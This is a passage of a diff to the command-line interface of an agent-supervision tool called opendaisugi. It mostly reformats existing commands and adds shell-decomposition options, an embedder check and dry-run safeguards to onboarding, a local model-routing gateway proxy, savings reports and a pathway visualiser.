+        f"prune: {verb} removed {report.prune.removed_count}, kept {report.prune.kept_count}"
+    )
     typer.echo(f"merge: {verb} merged {report.merge.merge_count} pair(s)")
 
 
@@ -1096,12 +1361,11 @@ def gardener_run_cmd(
 def gardener_watch_cmd(
     data_dir: Path = typer.Option(Path.home() / ".opendaisugi", "--data-dir"),
     min_interval_s: int = typer.Option(
-        3600, "--min-interval",
+        3600,
+        "--min-interval",
         help="Skip if the last run is newer than this many seconds.",
     ),
-    force: bool = typer.Option(
-        False, "--force", help="Ignore the min-interval check."
-    ),
+    force: bool = typer.Option(False, "--force", help="Ignore the min-interval check."),
     dry_run: bool = typer.Option(False, "--dry-run"),
 ) -> None:
     """Cron-friendly one-shot gardener. Skips if last run is within --min-interval.
@@ -1143,18 +1407,22 @@ def gardener_watch_cmd(
         data_dir.mkdir(parents=True, exist_ok=True)
         stamp_file.write_text(f"{now:.3f}")
 
-    typer.echo(json.dumps({
-        "skipped": False,
-        "ran_at": now,
-        "dry_run": dry_run,
-        "prune": {
-            "removed": report.prune.removed_count,
-            "kept": report.prune.kept_count,
-        },
-        "merge": {
-            "merged": report.merge.merge_count,
-        },
-    }))
+    typer.echo(
+        json.dumps(
+            {
+                "skipped": False,
+                "ran_at": now,
+                "dry_run": dry_run,
+                "prune": {
+                    "removed": report.prune.removed_count,
+                    "kept": report.prune.kept_count,
+                },
+                "merge": {
+                    "merged": report.merge.merge_count,
+                },
+            }
+        )
+    )
 
 
 @gardener_app.command("status")
@@ -1186,10 +1454,7 @@ def gardener_status_cmd(
     for p in pathways:
         total = p.hit_count + p.failure_count
         ratio = (p.failure_count / total) if total else 0.0
-        typer.echo(
-            f"  {p.id}  hits={p.hit_count}  fails={p.failure_count}  "
-            f"fail_ratio={ratio:.2f}"
-        )
+        typer.echo(f"  {p.id}  hits={p.hit_count}  fails={p.failure_count}  fail_ratio={ratio:.2f}")
 
 
 def _serialize_session(session) -> dict:
@@ -1201,20 +1466,25 @@ def _serialize_session(session) -> dict:
 
 @app.command("run")
 def run_cmd(
-    plan_path: Path = typer.Argument(..., exists=True, readable=True,
-                                     help="Path to plan YAML."),
-    envelope_path: Path = typer.Option(..., "--envelope", "-e",
-                                       exists=True, readable=True,
-                                       help="Path to envelope YAML."),
-    data_dir: Path = typer.Option(DEFAULT_DATA_DIR, "--data-dir",
-                                  help="Root data directory for the journal."),
-    dry_run: bool = typer.Option(False, "--dry-run",
-                                 help="Use DryRunExecutor — no real subprocesses."),
-    yes: bool = typer.Option(False, "--yes", "-y",
-                             help="Auto-approve every step "
-                                  "(sets DAISUGI_APPROVE=always for this run)."),
-    json_output: bool = typer.Option(False, "--json",
-                                     help="Emit the run session as JSON on stdout."),
+    plan_path: Path = typer.Argument(..., exists=True, readable=True, help="Path to plan YAML."),
+    envelope_path: Path = typer.Option(
+        ..., "--envelope", "-e", exists=True, readable=True, help="Path to envelope YAML."
+    ),
+    data_dir: Path = typer.Option(
+        DEFAULT_DATA_DIR, "--data-dir", help="Root data directory for the journal."
+    ),
+    dry_run: bool = typer.Option(
+        False, "--dry-run", help="Use DryRunExecutor — no real subprocesses."
+    ),
+    yes: bool = typer.Option(
+        False,
+        "--yes",
+        "-y",
+        help="Auto-approve every step (sets DAISUGI_APPROVE=always for this run).",
+    ),
+    json_output: bool = typer.Option(
+        False, "--json", help="Emit the run session as JSON on stdout."
+    ),
 ) -> None:
     """Execute PLAN against ENVELOPE under runtime supervision.
 
@@ -1258,9 +1528,11 @@ def run_cmd(
     else:
         typer.echo(f"Run {session.id} ({session.status.value})")
         for outcome in session.steps:
-            line = (f"  {outcome.step_id}: {outcome.status} "
-                    f"(rc={outcome.rc}, approved_by={outcome.approved_by}, "
-                    f"{outcome.duration_ms:.1f} ms)")
+            line = (
+                f"  {outcome.step_id}: {outcome.status} "
+                f"(rc={outcome.rc}, approved_by={outcome.approved_by}, "
+                f"{outcome.duration_ms:.1f} ms)"
+            )
             typer.echo(line)
             if outcome.error:
                 typer.echo(f"      error: {outcome.error}")
@@ -1290,32 +1562,37 @@ _VALID_THINKING_BUDGETS = {"light", "standard", "deep"}
 def generate_envelope_cmd(
     task: str = typer.Argument(..., help="Task description to envelope."),
     model: str = typer.Option(
-        "anthropic/claude-sonnet-4-20250514", "--model",
+        "anthropic/claude-sonnet-4-20250514",
+        "--model",
         help="LLM model (litellm provider/model format).",
     ),
     data_dir: Path = typer.Option(
-        DEFAULT_DATA_DIR, "--data-dir",
+        DEFAULT_DATA_DIR,
+        "--data-dir",
         help="Root data directory. Unused by this command but accepted for consistency.",
     ),
-    json_output: bool = typer.Option(
-        False, "--json", help="Emit JSON instead of YAML."
-    ),
+    json_output: bool = typer.Option(False, "--json", help="Emit JSON instead of YAML."),
     stakes: str = typer.Option(
-        "medium", "--stakes",
+        "medium",
+        "--stakes",
         help="Stakes level: low (uses default), medium (cache), high (always fresh).",
     ),
     low_stakes_envelope: Path | None = typer.Option(
-        None, "--low-stakes-envelope",
+        None,
+        "--low-stakes-envelope",
         help="Path to a JSON Envelope file; used when --stakes low is set.",
     ),
     thinking_budget: str = typer.Option(
-        "standard", "--thinking-budget",
+        "standard",
+        "--thinking-budget",
         help="Thinking budget: light, standard, deep (mapped per provider).",
     ),
     llm: str = typer.Option(
-        "litellm", "--llm",
+        "litellm",
+        "--llm",
         help="LLM backend: 'litellm' (default) or 'claude-code' (uses claude -p subprocess).",
     ),
+    allow_shell_decomposition: bool | None = _DECOMPOSE_OPT,
 ) -> None:
     """Generate a safety envelope for TASK via an LLM."""
     if llm not in {"litellm", "claude-code"}:
@@ -1363,6 +1640,17 @@ def generate_envelope_cmd(
     except EnvelopeGenerationError as e:
         typer.echo(f"Envelope generation failed: {e}", err=True)
         raise typer.Exit(code=2) from e
+
+    decompose = _resolve_decompose(allow_shell_decomposition, data_dir / "config.yaml")
+    if decompose:
+        envelope = envelope.model_copy(
+            update={
+                "permissions": envelope.permissions.model_copy(
+                    update={"shell_allow_decomposition": True}
+                )
+            }
+        )
+        _warn_if_decomposition_unusable(decompose)
     payload = envelope.model_dump(mode="json")
     if json_output:
         typer.echo(json.dumps(payload, indent=2))
@@ -1373,16 +1661,21 @@ def generate_envelope_cmd(
 @app.command("verify")
 def verify_cmd(
     plan_path: Path = typer.Argument(
-        ..., exists=True, dir_okay=False, readable=True,
+        ...,
+        exists=True,
+        dir_okay=False,
+        readable=True,
         help="Path to a YAML file containing a serialized ActionPlan.",
     ),
     envelope_path: Path = typer.Option(
-        ..., "--envelope", exists=True, dir_okay=False, readable=True,
+        ...,
+        "--envelope",
+        exists=True,
+        dir_okay=False,
+        readable=True,
         help="Path to a YAML file containing a serialized Envelope.",
     ),
-    json_output: bool = typer.Option(
-        False, "--json", help="Emit VerificationResult as JSON."
-    ),
+    json_output: bool = typer.Option(False, "--json", help="Emit VerificationResult as JSON."),
 ) -> None:
     """Verify an action plan against a safety envelope."""
     try:
@@ -1419,16 +1712,22 @@ def verify_cmd(
 @app.command("tend")
 def tend_cmd(
     data_dir: Path = typer.Option(
-        Path.home() / ".opendaisugi", "--data-dir",
+        Path.home() / ".opendaisugi",
+        "--data-dir",
         help="Daisugi data directory.",
     ),
     model: str = typer.Option(
-        "anthropic/claude-sonnet-4-20250514", "--model",
+        "anthropic/claude-sonnet-4-20250514",
+        "--model",
         help="Model used for template generalization + improvement.",
     ),
     min_traces: int = typer.Option(3, "--min-traces", help="Minimum cluster size to distill."),
-    lookback_days: int = typer.Option(30, "--lookback-days", help="How far back to scan the journal."),
-    dry_run: bool = typer.Option(False, "--dry-run", help="Run the pipeline but do not store pathways."),
+    lookback_days: int = typer.Option(
+        30, "--lookback-days", help="How far back to scan the journal."
+    ),
+    dry_run: bool = typer.Option(
+        False, "--dry-run", help="Run the pipeline but do not store pathways."
+    ),
 ) -> None:
     """Run the distiller. Scans successful traces and produces compiled pathways."""
     import asyncio
@@ -1442,6 +1741,7 @@ def tend_cmd(
     # dir; the pathway rows are discarded at process exit.
     if dry_run:
         from opendaisugi.pathway_store import PathwayStore
+
         dry_store = PathwayStore(":memory:")
         d = Daisugi(data_dir=data_dir, model=model, pathway_store=dry_store, tier1=tier1)
     else:
@@ -1460,41 +1760,56 @@ def tend_cmd(
 
 @app.command("onboard")
 def onboard_cmd(
-    data_dir: Path = typer.Option(
-        DEFAULT_DATA_DIR, "--data-dir", help="Daisugi data directory."
-    ),
+    data_dir: Path = typer.Option(DEFAULT_DATA_DIR, "--data-dir", help="Daisugi data directory."),
     model: str = typer.Option(
-        "anthropic/claude-sonnet-4-20250514", "--model",
-        help="Model for envelope generation + distillation.",
+        "anthropic/claude-sonnet-4-20250514",
+        "--model",
+        help="Model for episode splitting + distillation (envelopes are inferred, no LLM).",
     ),
     llm: str = typer.Option(
-        "litellm", "--llm",
+        "litellm",
+        "--llm",
         help="LLM backend: 'litellm' (default) or 'claude-code' (no API key — uses your Claude Code subscription).",
     ),
-    limit: int = typer.Option(
-        None, "--limit", help="Process only the N most recent transcripts."
-    ),
+    limit: int = typer.Option(None, "--limit", help="Process only the N most recent transcripts."),
     harness: list[str] = typer.Option(
-        None, "--harness",
+        None,
+        "--harness",
         help="Only process these harnesses (repeatable). Default: all discovered.",
     ),
-    concurrency: int = typer.Option(
-        5, "--concurrency", help="Max parallel envelope-generation calls."
+    min_tools: int = typer.Option(
+        3, "--min-tools", help="Merge episodes below this tool-call count."
     ),
-    min_tools: int = typer.Option(3, "--min-tools", help="Merge episodes below this tool-call count."),
-    max_tools: int = typer.Option(30, "--max-tools", help="LLM-split episodes above this tool-call count."),
-    min_traces: int = typer.Option(3, "--min-traces", help="Minimum cluster size to distill a pathway."),
+    max_tools: int = typer.Option(
+        30, "--max-tools", help="LLM-split episodes above this tool-call count."
+    ),
+    min_traces: int = typer.Option(
+        3, "--min-traces", help="Minimum cluster size to distill a pathway."
+    ),
     lookback_days: int = typer.Option(
-        3650, "--lookback-days",
+        3650,
+        "--lookback-days",
         help="How far back to scan ingested traces when distilling (default: all history).",
     ),
     threshold: float = typer.Option(
-        DEFAULT_PATHWAY_THRESHOLD, "--threshold",
+        DEFAULT_PATHWAY_THRESHOLD,
+        "--threshold",
         help="Pathway clustering/retrieval similarity threshold (0-1).",
     ),
     dry_run: bool = typer.Option(
-        False, "--dry-run", help="Discover + report only; no LLM calls, no pathways written."
+        False,
+        "--dry-run",
+        help="Preview: discover and deterministically verify each episode "
+        "(reports would-be pass/fail); makes NO model calls and writes no traces "
+        "or pathways. Episodes large enough to need the LLM splitter are skipped.",
     ),
+    allow_no_embedder: bool = typer.Option(
+        False,
+        "--allow-no-embedder",
+        help="Onboard without the pathway embedder: builds the verified journal "
+        "but distils NO token-saving pathways.",
+    ),
+    allow_shell_decomposition: bool | None = _DECOMPOSE_OPT,
     json_output: bool = typer.Option(False, "--json", help="Machine-readable JSON output."),
 ) -> None:
     """Turn existing conversations into token-saving pathways — the day-one flow.
@@ -1510,32 +1825,93 @@ def onboard_cmd(
     if llm != "litellm":
         os.environ["OPENDAISUGI_LLM_BACKEND"] = llm
 
+    # Pathway clustering IS the token-saving payoff, and it needs the embedder.
+    # Without it a real onboard would spend model tokens on envelope generation
+    # and distil zero pathways — so refuse up front (fail before spending), with
+    # an explicit opt-out for the "I only want the verified journal" case. A
+    # dry-run makes no calls, so it proceeds but says the payoff will be missing.
+    import importlib.util
+
+    if importlib.util.find_spec("sentence_transformers") is None:
+        msg_install = "  Install it:  pip install 'opendaisugi[search]'"
+        if dry_run:
+            typer.echo(
+                "note: the pathway embedder (sentence-transformers) is not installed — a "
+                "real onboard would distil NO token-saving pathways.\n" + msg_install
+            )
+        elif not allow_no_embedder:
+            typer.echo(
+                "onboard needs the pathway embedder to turn traces into token-saving "
+                "pathways, but 'sentence-transformers' is not installed. Without it this "
+                "run would spend model tokens on envelope generation and distil ZERO "
+                "pathways.\n" + msg_install + "\n"
+                "  Or build only the verified journal (no pathways):  --allow-no-embedder",
+                err=True,
+            )
+            raise typer.Exit(code=2)
+
     from opendaisugi.local_setup import load_configured_tier1
     from opendaisugi.onboarding import DiscoveredTranscript, onboard
 
+    decompose = _resolve_decompose(allow_shell_decomposition, data_dir / "config.yaml")
     journal = Journal(data_dir=data_dir)
-    tier1 = load_configured_tier1(data_dir)  # defer bulk envelope-gen to a qualified local model if wired
+    tier1 = load_configured_tier1(
+        data_dir
+    )  # defer distillation LLM calls to a qualified local model if wired
+
+    # Content-addressed cache of LLM episode-split boundaries, so re-onboarding
+    # the same transcripts doesn't re-pay the splitter. Skipped in dry-run: no
+    # splitting happens there, and a dry run must not write to the data dir.
+    from opendaisugi.parsers.claude_code import SPLIT_PROMPT_VERSION
+    from opendaisugi.split_cache import SplitCache
+
+    split_cache = (
+        None
+        if dry_run
+        else SplitCache(data_dir / "split_cache.db", prompt_version=SPLIT_PROMPT_VERSION)
+    )
 
     def parse_one(t: "DiscoveredTranscript"):
         # The harness id doubles as the parser format name (claude-code, ...).
+        # A --dry-run must make ZERO model calls (it is "discover + report only").
+        # The parser's LLM episode-splitter fires for any episode over max_tools
+        # and runs before the dry-run gate, so lift the cap above any real episode
+        # in dry-run to disable it — otherwise a "free" preview silently bills the
+        # user for `claude -p` splitting calls across every large transcript.
+        effective_max_tools = 10**9 if dry_run else max_tools
         try:
-            parser = get_parser(t.harness, min_tools=min_tools, max_tools=max_tools, model=model)
+            parser = get_parser(
+                t.harness,
+                min_tools=min_tools,
+                max_tools=effective_max_tools,
+                model=model,
+                split_cache=split_cache,
+            )
         except ValueError:
             return None  # no parser registered for this harness — onboard skips + warns
         return parser.parse(t.path)
 
     async def ingest_one(parse_result):
         return await ingest_episodes(
-            parse_result, journal, concurrency=concurrency, model=model,
-            dry_run=dry_run, tier1=tier1,
+            parse_result,
+            journal,
+            dry_run=dry_run,
+            allow_shell_decomposition=decompose,
+            # A dry-run can't LLM-split, so preview only episodes the real run
+            # wouldn't split either (<= max_tools); larger ones are skipped, not
+            # verified whole (which would give a misleading coarse verdict).
+            preview_max_steps=max_tools if dry_run else None,
         )
 
     async def run_tend():
         from opendaisugi import Daisugi
 
         d = Daisugi(
-            data_dir=data_dir, model=model, pathway_store=True,
-            pathway_threshold=threshold, tier1=tier1,
+            data_dir=data_dir,
+            model=model,
+            pathway_store=True,
+            pathway_threshold=threshold,
+            tier1=tier1,
         )
         return await d.tend(
             min_traces=min_traces,
@@ -1555,6 +1931,16 @@ def onboard_cmd(
         )
     )
 
+    if decompose:
+        from opendaisugi.shell_decompose import parser_available
+
+        if not parser_available():
+            report.warnings.append(
+                "shell decomposition is ON but the bash grammar isn't installed — every "
+                "compound command was DENIED (fail-closed). Install it with: "
+                "uv add 'opendaisugi[shell]'"
+            )
+
     if json_output:
         typer.echo(json.dumps(report.__dict__, indent=2, default=str))
         return
@@ -1565,16 +1951,34 @@ def onboard_cmd(
         f"Discovered {report.transcripts_found} transcript(s); "
         f"processed {report.transcripts_processed} ({by})."
     )
-    typer.echo(
-        f"Journal: {report.traces_passed} verified, {report.traces_failed} failed, "
-        f"{report.traces_skipped} already present."
-    )
     if dry_run:
-        typer.echo("Dry run — no pathways written. Re-run without --dry-run to distill.")
+        previewed = report.traces_passed + report.traces_failed
+        typer.echo("Preview — deterministic verify, no model calls, nothing written:")
+        typer.echo(
+            f"  {previewed} episode(s) previewed: {report.traces_passed} would verify, "
+            f"{report.traces_failed} would fail"
+            + (f"; {report.traces_skipped} already present" if report.traces_skipped else "")
+        )
+        if report.traces_preview_skipped:
+            # These are excluded from the pass/fail above, so that pair is a
+            # verdict on a SUBSET, not the whole corpus — say so plainly.
+            typer.echo(
+                f"  {report.traces_preview_skipped} more episode(s) too large to preview here — a "
+                f"real onboard LLM-splits each into sub-episodes (which mostly verify), so the "
+                f"counts above cover only the {previewed} that don't need splitting."
+            )
+        if not decompose and report.traces_failed:
+            typer.echo(
+                "  tip: many failures are compound shells (a && b) rejected without "
+                "decomposition — add --allow-shell-decomposition to preview them as they'd run."
+            )
+        typer.echo("Dry run — re-run without --dry-run to journal + distill.")
     else:
         typer.echo(
-            f"Pathways: {report.pathways_created} new, {report.pathways_updated} updated."
+            f"Journal: {report.traces_passed} verified, {report.traces_failed} failed, "
+            f"{report.traces_skipped} already present."
         )
+        typer.echo(f"Pathways: {report.pathways_created} new, {report.pathways_updated} updated.")
         if report.pathways_created or report.pathways_updated:
             typer.echo(
                 "  → Token routing is live: matching tasks now skip envelope generation (Tier-0)."
@@ -1603,9 +2007,10 @@ def route_cmd(
         DEFAULT_PATHWAY_THRESHOLD, "--threshold", help="Pathway-match threshold (0-1)."
     ),
     harness: str = typer.Option(
-        "claude-code", "--harness",
+        "claude-code",
+        "--harness",
         help="Host harness: claude-code, codex, ollama/local, hermes, openclaw. "
-             "The Anthropic advisor-tool pairing is only suggested on Claude/Anthropic harnesses.",
+        "The Anthropic advisor-tool pairing is only suggested on Claude/Anthropic harnesses.",
     ),
     json_output: bool = typer.Option(False, "--json", help="Machine-readable JSON output."),
 ) -> None:
@@ -1640,34 +2045,326 @@ def route_cmd(
     typer.echo(f"  why:        {advice.reason}")
 
 
+@app.command("gateway")
+def gateway_cmd(
+    host: str = typer.Option("127.0.0.1", "--host", help="Bind address."),
+    port: int = typer.Option(8787, "--port", help="Bind port."),
+    upstream: str = typer.Option(
+        "https://api.anthropic.com",
+        "--upstream",
+        help="Where saved turns go: a raw provider (replace) or a NeMo Switchyard endpoint "
+        "(compose — it does trained routing, we add reuse + the journal on top).",
+    ),
+    cheap_model: str = typer.Option(
+        "claude-haiku-4-5", "--cheap-model", help="Model an easy turn is routed onto."
+    ),
+    data_dir: Path = typer.Option(
+        DEFAULT_DATA_DIR, "--data-dir", help="Daisugi data directory (holds the turn journal)."
+    ),
+    capture_answers: bool = typer.Option(
+        False,
+        "--capture-answers/--no-capture-answers",
+        help="Persist each turn's raw response text to <data-dir>/gateway/answers.jsonl (a "
+        "bounded ring) for freshness-gated reuse. Opt-in and off by default — this is the "
+        "one place the gateway retains response content, so leave it off unless you want "
+        "that reuse.",
+    ),
+    local_model: str = typer.Option(
+        None,
+        "--local-model",
+        help="A qualified local model id (ADR-0015): easy turns take this rung ahead of "
+        "any cloud downgrade — zero quota, and cache stickiness never blocks it. "
+        "Defaults to gateway_local_model from config.yaml.",
+    ),
+    openai_upstream: str = typer.Option(
+        "https://api.openai.com",
+        "--openai-upstream",
+        help="Upstream for OpenAI-wire requests (…/chat/completions — Codex and every "
+        "OpenAI-wire agent).",
+    ),
+    openai_cheap_model: str = typer.Option(
+        "gpt-5-mini",
+        "--openai-cheap-model",
+        help="Model an easy OpenAI-wire turn is routed onto (must be a model the OpenAI "
+        "upstream serves). Empty string disables routing on that wire (pure passthrough).",
+    ),
+) -> None:
+    """Run the token-saving gateway: a local proxy any harness points at via base_url.
+
+    It forwards each whole agent turn to the provider, first routing an easy turn onto the
+    cheap model (never overriding a hard turn) and journalling what that saved. It fails open
+    — if it can't route or the cheap model rejects a turn, the original goes through untouched,
+    so you lose savings, never the turn. Point a harness at it, e.g.::
+
+        ANTHROPIC_BASE_URL=http://127.0.0.1:8787 claude
+
+    The same proxy speaks the OpenAI wire on …/chat/completions, so Codex points at it too
+    (config.toml model_providers base_url = "http://127.0.0.1:8787/v1", wire_api = "chat").
+    """
+    from opendaisugi.config import load_config
+    from opendaisugi.gateway_asgi import serve_gateway
+
+    if local_model is None:
+        local_model = load_config().gateway_local_model
+    typer.echo(f"opendaisugi gateway  →  {upstream}")
+    if local_model:
+        typer.echo(f"  local rung: easy turns → {local_model}")
+    typer.echo(f"  listening on http://{host}:{port}  (journal: {data_dir}/gateway/turns.jsonl)")
+    typer.echo(f"  point your harness at it:  ANTHROPIC_BASE_URL=http://{host}:{port}")
+    if openai_cheap_model:
+        typer.echo(
+            f"  OpenAI wire: …/chat/completions → {openai_upstream} "
+            f"(easy turns → {openai_cheap_model})"
+        )
+    if capture_answers:
+        typer.echo(f"  capturing answers to:      {data_dir}/gateway/answers.jsonl")
+    serve_gateway(
+        host=host,
+        port=port,
+        upstream_base_url=upstream,
+        data_dir=data_dir,
+        local_model=local_model,
+        cheap_model=cheap_model,
+        capture_answers=capture_answers,
+        openai_upstream_base_url=openai_upstream,
+        openai_cheap_model=openai_cheap_model or None,
+    )
+
+
+@app.command("distill-repeats")
+def distill_repeats_cmd(
+    data_dir: Path = typer.Option(
+        DEFAULT_DATA_DIR,
+        "--data-dir",
+        help="Daisugi data directory (reads <data-dir>/gateway/turns.jsonl).",
+    ),
+    top: int = typer.Option(20, "--top", help="Maximum number of rows to print."),
+) -> None:
+    """Rank repeated gateway asks into a reuse worklist — the frontier spend, ranked.
+
+    Reads the gateway turn journal, clusters repeated asks by embedding similarity
+    (paraphrases included), and prints the clusters ranked by the frontier tokens
+    they've collectively cost — the biggest, most-repeated asks are exactly the
+    ones worth turning into a reusable pathway first. Tokens first, dollars
+    alongside. LLM-free: this only aggregates journal numbers and, per cluster,
+    does one read-only pathway-store lookup to flag a repeat that's already
+    reusable. It never mints a pathway.
+    """
+    from opendaisugi.gateway_distill import rank_reuse_candidates
+    from opendaisugi.gateway_journal import GatewayJournal
+    from opendaisugi.pathway_store import PathwayStore
+
+    journal_path = data_dir / "gateway" / "turns.jsonl"
+    records = GatewayJournal(path=journal_path).load()
+    if not records:
+        typer.echo("no turns recorded yet — run `daisugi gateway` to start journaling.")
+        return
+
+    db = data_dir / "pathways.db"
+    pathway_store = PathwayStore(db) if db.exists() else None
+
+    try:
+        candidates = rank_reuse_candidates(records, pathway_store=pathway_store)
+    except ImportError as e:
+        typer.echo(str(e), err=True)
+        raise typer.Exit(code=2)
+
+    if not candidates:
+        typer.echo("no repeated asks found yet.")
+        return
+
+    typer.echo(f"{'rank':>4}  {'occ':>4}  {'tokens':>10}  {'dollars':>9}  reusable?  task")
+    for i, c in enumerate(candidates[:top], start=1):
+        task_display = " ".join(c.cluster.representative_task.split())
+        if len(task_display) > 70:
+            task_display = task_display[:67] + "..."
+        reusable = "yes" if c.already_reusable else "no"
+        typer.echo(
+            f"{i:>4}  {c.cluster.count:>4}  {c.total_tokens:>10,}  "
+            f"${c.total_dollars:>8.2f}  {reusable:>9}  {task_display}"
+        )
+
+
+@app.command("gateway-report")
+def gateway_report_cmd(
+    data_dir: Path = typer.Option(
+        DEFAULT_DATA_DIR,
+        "--data-dir",
+        help="Daisugi data directory (reads <data-dir>/gateway/turns.jsonl).",
+    ),
+) -> None:
+    """Calibrate the gateway on a real recorded day: realized routing + potential reuse.
+
+    Reads the gateway turn journal and prints three clearly-separated sections: what
+    routing has ALREADY saved (measured, straight off the journal), what repeat-driven
+    reuse COULD additionally save (a ceiling — every repeat-after-the-first served from a
+    perfect, fresh cache, which nothing here does yet), and the two combined. Tokens
+    first, dollars alongside. LLM-free except for the same one embed call
+    `distill-repeats` uses to cluster repeats (requires the [search] extra).
+    """
+    from opendaisugi.gateway_journal import GatewayJournal
+    from opendaisugi.gateway_report import build_report
+
+    journal_path = data_dir / "gateway" / "turns.jsonl"
+    records = GatewayJournal(path=journal_path).load()
+    if not records:
+        typer.echo("no turns recorded yet — run `daisugi gateway` to start journaling.")
+        return
+
+    try:
+        report = build_report(records)
+    except ImportError as e:
+        typer.echo(str(e), err=True)
+        raise typer.Exit(code=2) from e
+
+    typer.echo("Routing (realized) — measured from turns already run:")
+    typer.echo(f"  turns:                 {report.turns}")
+    typer.echo(f"  downgraded turns:      {report.downgraded_turns}")
+    typer.echo(f"  frontier tokens saved: {report.routing_frontier_tokens_saved:,}")
+    typer.echo(f"  dollars saved:         ${report.routing_dollars_saved:.2f}")
+    typer.echo(f"  blended multiplier:    {report.routing_multiplier:.2f}x")
+    typer.echo(f"  local-rung turns:      {report.local_turns}")
+    typer.echo("")
+    typer.echo("Prompt cache (measured) — the provider's own usage split:")
+    typer.echo(f"  cache read tokens:     {report.cache_read_tokens:,}")
+    typer.echo(f"  cache write tokens:    {report.cache_creation_tokens:,}")
+    typer.echo(f"  cache hit rate:        {report.cache_hit_rate:.1%} of all input")
+    typer.echo("")
+    typer.echo("Reuse opportunity (ceiling) — NOT measured, assumes perfect fresh reuse:")
+    typer.echo(f"  repeat clusters:       {report.repeat_clusters}")
+    typer.echo(f"  recoverable tokens:    {report.reuse_recoverable_tokens:,}")
+    typer.echo(f"  recoverable dollars:   ${report.reuse_recoverable_dollars:.2f}")
+    typer.echo("")
+    typer.echo("Combined (ceiling) — realized routing plus the reuse ceiling above:")
+    typer.echo(f"  frontier tokens saved: {report.combined_frontier_tokens_saved:,}")
+    typer.echo(f"  blended multiplier:    {report.combined_multiplier:.2f}x")
+    typer.echo("")
+    typer.echo(
+        "note: the Reuse and Combined figures are a CEILING, assuming every repeat-after-"
+        "the-first is served from a perfect, fresh cache — only Routing above is measured."
+    )
+
+
+@app.command("viz")
+def viz_cmd(
+    pathway_id: str = typer.Argument(
+        None, help="Pathway id to visualize. Omit to list distilled pathways."
+    ),
+    data_dir: Path = typer.Option(
+        DEFAULT_DATA_DIR, "--data-dir", help="Daisugi data directory (pathway store)."
+    ),
+    output: Path = typer.Option(
+        None, "-o", "--output", help="Write the HTML here (default: <pathway_id>.html)."
+    ),
+) -> None:
+    """Render a distilled pathway's plan as a standalone execution-monitor page.
+
+    Produces a self-contained HTML file (all CSS/JS inline, no external fetches):
+    the plan's dependency waves, per-step model sizing, and any step the
+    envelope refuses — with its proven reason. Pure view; no LLM call, no writes
+    beyond the output file.
+    """
+    from opendaisugi.pathway_store import PathwayStore
+    from opendaisugi.viz import render_dag_html
+
+    db = data_dir / "pathways.db"
+    if not db.exists():
+        typer.echo(
+            f"No pathway store at {db}. Run `daisugi onboard` or `daisugi tend` first.",
+            err=True,
+        )
+        raise typer.Exit(code=1)
+    store = PathwayStore(db)
+
+    if not pathway_id:
+        rows = store.list_all()
+        if not rows:
+            typer.echo("No pathways distilled yet. Run `daisugi onboard` or `daisugi tend`.")
+            return
+        typer.echo(f"{len(rows)} pathway(s) — pass an id to `daisugi viz`:")
+        for p in rows:
+            typer.echo(f"  {p.id}  {p.task_description[:64]}")
+        return
+
+    pathway = store.get(pathway_id)
+    if pathway is None:
+        typer.echo(f"No pathway {pathway_id!r} in {db}. Run `daisugi viz` to list.", err=True)
+        raise typer.Exit(code=1)
+
+    # Title the page with the distilled task description (the pathway's envelope
+    # may carry a terse per-trace task label from its source runs).
+    envelope = pathway.envelope.model_copy(update={"task": pathway.task_description})
+    html = render_dag_html(pathway.plan_template, envelope)
+    out = output or Path(f"{pathway_id}.html")
+    out.write_text(html, encoding="utf-8")
+    typer.echo(f"Wrote {out} ({len(html)} bytes) — open it in a browser.")
+
+
 @app.command("orchestrate")
 def orchestrate_cmd(
     prompt: str = typer.Argument(..., help="The prompt to run end to end."),
     envelope_path: "Path | None" = typer.Option(
-        None, "--envelope", "-e",
+        None,
+        "--envelope",
+        "-e",
         help="Envelope YAML (authorization boundary). If omitted, one is generated for the prompt.",
     ),
     budget: "int | None" = typer.Option(
-        None, "--budget", "-b",
+        None,
+        "--budget",
+        "-b",
         help="Approximate token budget for the run (gates routing during execution). Omit for unbudgeted.",
     ),
+    strict_budget: bool = typer.Option(
+        False,
+        "--strict-budget",
+        help="Stop when the budget is exhausted instead of downgrading to a cheaper "
+        "model. Note: --budget bounds mid-plan STEP ROUTING only — decompose and "
+        "synthesis are overhead, outside it, so it is not a total-spend cap; and "
+        "because a step's spend is counted before the check, this stops the NEXT "
+        "step after the budget is crossed. No effect without --budget.",
+    ),
+    deterministic_synthesis: bool = typer.Option(
+        False,
+        "--deterministic-synthesis",
+        help="Assemble the final answer from step outputs deterministically instead of "
+        "with an LLM. On a reused distilled pathway (decompose skipped, shell/file/"
+        "network steps run without inference) this is a fully inference-free run.",
+    ),
+    max_parallel: int = typer.Option(
+        1,
+        "--max-parallel",
+        help="Run independent steps in the same dependency level concurrently, up to "
+        "this many at once (1 = sequential, the default). Deterministic steps "
+        "(shell/file/network) always qualify; LLM task steps qualify only when the "
+        "run is unbudgeted (omit --budget), where model choice is order-independent.",
+    ),
     model: str = typer.Option(
-        "anthropic/claude-sonnet-4-20250514", "--model",
+        "anthropic/claude-sonnet-4-20250514",
+        "--model",
         help="Model used to decompose the prompt (and generate the envelope if none is given).",
     ),
     llm: str = typer.Option(
-        "litellm", "--llm",
+        "litellm",
+        "--llm",
         help="LLM backend: 'litellm' (needs ANTHROPIC_API_KEY) or 'claude-code' "
-             "(no API key — uses your Claude Code subscription via a claude -p subprocess).",
+        "(no API key — uses your Claude Code subscription via a claude -p subprocess).",
     ),
-    stakes: str = typer.Option("medium", "--stakes", help="Stakes for a generated envelope: low|medium|high."),
+    stakes: str = typer.Option(
+        "medium", "--stakes", help="Stakes for a generated envelope: low|medium|high."
+    ),
     cost: bool = typer.Option(
-        False, "--cost",
+        False,
+        "--cost",
         help="Show a cost figure for the run — exact on the claude-code backend "
-             "(Claude Code's own accounting), estimated on litellm. Off by default.",
+        "(Claude Code's own accounting), estimated on litellm. Off by default.",
     ),
-    data_dir: Path = typer.Option(DEFAULT_DATA_DIR, "--data-dir", help="Daisugi data dir (pathway store + journal)."),
-    json_output: bool = typer.Option(False, "--json", help="Emit the orchestration result as JSON."),
+    data_dir: Path = typer.Option(
+        DEFAULT_DATA_DIR, "--data-dir", help="Daisugi data dir (pathway store + journal)."
+    ),
+    json_output: bool = typer.Option(
+        False, "--json", help="Emit the orchestration result as JSON."
+    ),
 ) -> None:
     """Run PROMPT end to end: decompose → size → supervised execute → synthesize.
 
@@ -1697,9 +2394,17 @@ def orchestrate_cmd(
 
     d = Daisugi(model=model, data_dir=data_dir)
     try:
-        result = asyncio.run(d.orchestrate(
-            prompt, envelope=envelope, budget_tokens=budget, stakes=stakes,
